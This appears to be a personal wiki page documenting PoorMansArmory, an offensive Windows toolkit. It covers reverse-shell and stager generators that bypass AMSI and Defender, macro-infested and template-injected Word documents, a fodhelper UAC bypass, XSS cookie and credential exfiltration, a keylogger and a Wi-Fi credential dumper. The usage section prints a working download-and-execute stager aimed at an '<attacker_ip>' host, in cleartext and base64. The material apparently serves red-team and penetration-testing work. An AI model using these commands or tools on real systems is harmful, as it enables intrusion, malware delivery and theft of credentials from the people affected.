
>[!info]
>This note is still in development.
## Overview
---
> [!tip]
> The **PoorMansArmory** repository can be found [here](https://github.com/tylerdotrar/PoorMansArmory).

**PoorMansArmory** is a personal project of mine that is a collection of robust Windows-based payload generators and tools that aim to bypass AMSI, Windows Defender, and self-signed certificate checks. Tools range from a custom python HTTP(s) server, robust PowerShell reverse shell generator, remote template injected .docx generator, XSS and XXE PoC payloads, etc.

## Usage
---
### ``Import-PMA.ps1``

This is a simple script to import the primary **PoorMansArmory** scripts into the current session,
while ignoring the less important ones (i.e., ``misc``, ``officemacros/lib``).

**Syntax:**
```powershell
. ./Import-PMA.ps1
```
![Import-PMA.ps1](https://cdn.discordapp.com/attachments/855920119292362802/1156693253626798120/image.png?ex=6515e609&is=65149489&hm=b9e8066b734d9e4e4e2c43acd2664ed4c340006e1268916c5b3a9d05362a1f80&)

---
### ``pma_server.py``

```
# Synopsis:
# Simple Flask web server for bi-directional file transfers, supporting
# both HTTP and HTTPS using self-signed certificates.  Intended to be
# used with the PowerShell WebClient helper script(s).

# Version 4.0.0 introduces Web Exploitation:
#  o  XSS Cookie Exfiltration
#  o  XSS Saved Credential Exfiltration
#  o  XSS Keylogging
#  o  XXE Data Extraction 

# Parameters:
# --directory <string>  (default: ./uploads)
# --port <int>          (default: 80)
# --ssl                 (default: false)
# --debug               (default: false)
# --help
```

![pma_server](https://cdn.discordapp.com/attachments/855920119292362802/1156685487151530085/image.png?ex=6515dece&is=65148d4e&hm=270a1d232abd1ae53c1396ee6e0b5c47bc8bae45f2b0bc8c19ce908d4e4d442b&)

---
####  WebClientHelpers 

Optional "WebClientHelpers" can be added to either the reverse shell or into a session, adding ``download``, ``upload``, and ``import`` functionality, allowing seemlessly communication with the ``pma_server.py`` web server for lateral file transfers. The``import`` fuctionality specifically will attempt to remotely load hosted files into the session.  If the filename ends with ``.dll`` or ``.exe``, the function will attempt .NET reflection. Otherwise, the function will attempt to load the file assuming it contains PowerShell code.

- Using the **-WebClientHelpers** or **-WebClientHelpersURL <target_url>** parameters with ``Get-RevShell.ps1`` will incorporate them into the reverse shell payload.
- Using ``Load-WebClientHelpers.ps1`` can retro-actively load them into the current session using Global scopes.

**Functions TL;DR:**
- ``download``	-->	Download files hosted on the PMA server
- ``upload``    -->	Upload files to the PMA server
- ``import``	-->	Load PowerShell files and C# binaries into the session

---
#### Advanced Example

![Advanced Example](https://cdn.discordapp.com/attachments/855920119292362802/1156680964861341816/image.png?ex=6515da98&is=65148918&hm=7f407b06378a9e22c8e0e6bc3b4d4b920644ba53fd6e62491e5a7bca08cc3a24&)

1. Launch ``pma_server.py`` to listen over port 443.
2. Set up an SSL revshell listener on port 53.
3. Execute advanced ``Get-RevShell.ps1`` payload on the victim (that includes the **-WebClientHelpers** parameter).
4. Use WebClient helpers to upload and import file(s) (this example includes .NET reflection).
5. See files laterally moving on the ``pma_server.py``.
6. Set up a second listener on port 80.
7. Execute the ``SharpShell.dll`` PoC via .NET reflection.
8. Successful ``SharpShell`` execution.

---
### revshells

This directory contains scripts intended for advanced, robust reverse shell generation. They have been tested and built to work in both Linux and Windows Environments (i.e., **PowerShell** and **PowerShell Core / pwsh**), and default to PowerShell 5.0 payloads, but can be toggled to support PowerShell 2.0.

---
#### ``Get-RevShell.ps1``

```
# Synopsis:
# Modular, robust custom reverse shell generator with randomly generated variables
# that can bypass Windows Defender, provide seemless encryption, and have built-in
# tools for intuitive lateral file tranfers.
# 
# Parameters:
#    Main Functionality
#      -IPAddress             -->   Attacker IP address (required)
#      -Port                  -->   Attacker listening port (required)
#      -Raw                   -->   Return reverse shell payload in cleartext rather than base64
#      -Help                  -->   Return Get-Help information
#
#    Modular Options
#      -AmsiBypass            -->   Disable AMSI in current session (validated: 26SEP2023)
#      -SSL                   -->   Encrypt reverse shell via SSL with self-signed certificates
#      -HttpsBypass           -->   Disable HTTPS self-signed certificate checks in the session
#      -B64Reflection         -->   Reflects a static Base64 string of 'SSC.dll' instead of using Add-Type in the payload
#      -PowerShell2Support    -->   Adjust the reverse shell payload to support PowerShell 2.0
#      -Headless              -->   Create reverse shell payload without '-nop -ex bypass -wi h' parameters
#      -Verbose               -->   Make reverse shell variables descriptive instead of randomly generated
#
#    PMA Server Compatibility (Static)
#      -WebClientHelpers      -->   Add WebClientHelpers ('download','upload','import') into the revshell, pointing to the revshell IP address
#      -RemoteReflection      -->   Remotely reflect 'SSC.dll' from the revshell IP address instead of using Add-Type in the payload
#
#    PMA Server Compatibility (Specified)
#      -RemoteReflectionURL   -->   Specific URL hosting 'SSC.dll' to reflect (e.g., 'http(s)://<ip_addr>/SSC.dll')
#      -WebClientHelpersURL   -->   Specific URL of 'pma_server.py' to point WebClientHelpers to (e.g., 'http(s)://<ip_addr>')
```

---
#### ``Get-Stager.ps1`` 

```
# Synopsis:
# Simple PowerShell stager generator to point to web hosted payloads or commands.
# 
# Parameters:
#   -PayloadURL  -->  URL pointing to the reverse shell payload
#   -Command     -->  PowerShell command to execute instead of a reverse shell stager
#   -Raw         -->  Return stager payload in cleartext rather than base64
#   -Headless    -->  Create stager payload without '-' parameters
#   -Help        -->  Return Get-Help information
```

---
#### Examples

```powershell
# View all parameters
Get-RevShell -Help
Get-Stager -Help

# Simple PowerShell Reverse Shell (base64)
Get-RevShell <attacker_ip> <listening_port>

# Simple PowerShell Reverse Shell (cleartext)
Get-RevShell <attacker_ip> <listening_port> -Raw

# PowerShell 2.0 Compatible Reverse Shell w/ Verbose Variables (cleartext)
Get-RevShell <attacker_ip> <listening_port> -Raw -Verbose -PowerShell2Support

# SSL Encrypted PowerShell Reverse Shell w/ AMSI Bypass (base64)
Get-RevShell <attacker_ip> <listening_port> -SSL -AmsiBypass

# Stager pointing to Robust PowerShell Reverse Shell
Get-RevShell <attacker_ip> <listening_port> -SSL -AmsiBypass -WebClientHelpers > ./uploads/revshell
Get-Stager -PayloadURL "http(s)://<attacker_ip>/revshell"

# Output (default):
powershell -nop -ex bypass -wi h -e aQBlAHgAIAAoACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwAHMAKABzACkAOgAvAC8APABhAHQAdABhAGMAawBlAHIAXwBpAHAAPgAvAHIAZQB2AHMAaABlAGwAbAAnACkAKQA=

# Output (cleartext):
powershell -nop -ex bypass -wi h -c {iex ((New-Object System.Net.WebClient).DownloadString('https(s)://<attacker_ip>/revshell'))}
```

---
### officemacros 

This directory contains scripts intended for Microsoft Office-based payloads in the form of VBA macros and remote template injection.  

---
#### ``Get-MacroInfestedWordDoc.ps1`` 

```powershell
# Synopsis:
# Generate Macro Infested Word 97-2003 Documents (.doc)
# 
# Parameters:
#   -DocumentName   -->  Output name of the malicious Word Document (.doc)
#   -PayloadURL     -->  URL of the hosted payload that the macro downloads and executes
#   -MacroContents  -->  Advanced: User inputs custom macro instead of the generated one
#   -Help           -->  Return Get-Help information

# Example:
Get-MacroInfestedWordDoc -DocumentName invoice.doc -PayloadURL http://<attacker_ip>/revshell
```

---
#### ``Get-TemplateInjectedPayload.ps1``

```powershell
# Synopsis:
# Generate Macro Infested Word Template (.dotm) an Inject into a Word Document (.docx)
# 
# Parameters:
#   -TemplateURL    -->  URL where the malicious Word Template (.dotm) will be hosted
#   -PayloadURL     -->  URL of the hosted payload that the macro downloads and executes
#   -Document       -->  Advanced: Target templated Word Document (.docx) to inject
#   -MacroContents  -->  Advanced: User inputs custom macro instead of the generated one
#   -Help           -->  Return Get-Help information

# Example:
Get-TemplateInjectedPayload -TemplateURL http://<attacker_ip>/office/update.dotm -PayloadURL http://<attacker_ip>/revshell
```

---
### privesc

This directory contains scripts intended for privilege escalation or enumeration for privilege escalation vectors.  

---

#### ``Enum-Services.ps1``

```
# Synopsis:
# Enumeration script developed to easily parse the Access Control Lists (ACLs) and other parameters
# of Windows Services, such as the service owner, start mode, and whether the service path is vulnerable
# to an unquoted service path attack.  Unquoted service paths are able to be audited for writeability
# via the '-Audit' parameter.
#
# By default the script will return an object containing sorted service binary ACLs.
# 
# Parameters:
#   -StartMode      -->  Services with specified start modes (e.g., 'Auto','Disabled','Manual')
#   -UnquotedPaths  -->  Services containing spaces in their paths but not wrapped in quotations
#   -Audit          -->  Test if vulnerable portions of the unquoted path are writeable for the current user
#   -Owner          -->  Services belonging to specified Owner (e.g., 'SYSTEM')
#   -FullControl    -->  Services with FullControl access rights for specified group (e.g., 'Administrators')
#   -OnlyPath       -->  Return full service paths instead of ACL's
#   -Help           -->  Return Get-Help information
```

---
#### ``Invoke-FodHelperUACBypass.ps1`` 

```
# Synopsis:
# Privilege esclation script developed to exploit the 'fodhelper.exe' UAC bypass,
# with moderate validation built in (e.g., session is 64-bit, current user is in
# the Local Administrators group).
# 
# Parameters:
#   -Payload  -->  Command to execute when 'fodhelper.exe' is executed.
#   -Help     -->  Return Get-Help information
```

---
### misc

This directory contains scripts and `.dll's` that are either scarcely used, difficult to categorize, or simple/educational in design.  

 - **Helpers**
	- This includes `SSC.dll` and `Load-WebClientHelpers.ps1`

- **Proof-of-Concept (PoC)**
	- This includes the `Capture-Keys.ps1` keylogger, `Get-WifiCredentials.ps1` dumper, `Execute-As.ps1` script, and `SharpShell.dll`.

- **Educational**
	- This includes `Invoke-RevShellSSL.ps1`, `Invoke-SharpShell.ps1`, and `Bypass-ExecPolicy.ps1`.
